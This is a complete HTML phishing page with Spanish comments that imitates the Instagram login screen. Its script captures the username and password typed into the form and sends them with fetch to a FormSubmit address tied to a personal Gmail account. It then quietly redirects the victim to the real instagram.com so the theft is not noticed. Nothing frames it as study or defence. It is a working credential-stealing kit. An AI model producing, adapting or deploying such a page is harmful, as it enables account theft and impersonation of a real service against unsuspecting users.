<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión · Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 175px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            box-sizing: border-box; /* Para que el padding no rompa el ancho */
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 14px;
        }
        button:hover {
            background-color: #0074c4;
        }
        button:disabled {
            background-color: #bcdbf7;
            cursor: default;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider span {
            padding: 0 10px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            color: #8e8e8e;
        }
        /* Spinner de carga */
        .spinner {
            display: none;
            margin: 10px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/YE-ZiHzx2Yz.png" alt="Instagram Logo">
    </div>
    
    <!-- El formulario ahora tiene un ID específico -->
    <form id="loginForm">
        <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required autocomplete="off">
        <input type="password" name="password" placeholder="Contraseña" required>
        
        <button type="submit" id="submitBtn">Iniciar sesión</button>
        
        <!-- Indicador de carga -->
        <div class="spinner" id="loadingSpinner"></div>
    </form>
    
    <div class="divider">
        <span>O</span>
    </div>
    <div class="footer">
        <a href="#">¿Has olvidado la contraseña?</a>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = this.username.value;
        const password = this.password.value;
        const btn = document.getElementById('submitBtn');
        const spinner = document.getElementById('loadingSpinner');

        // Deshabilitar botón y mostrar spinner
        btn.disabled = true;
        btn.innerText = "Conectando...";
        spinner.style.display = 'block';

        // Enviar datos a FormSubmit
        fetch(`https://formsubmit.co/ajax/miguelalva199311@gmail.com`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => response.json())
        .then(data => {
            // Esperar un segundo y redirigir a Instagram real
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 1500); 
        })
        .catch(error => {
            console.error('Error:', error);
            // Si hay error, también redirigimos para no dejar al usuario atascado
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 1000);
        });
    });
</script>

</body>
</html>
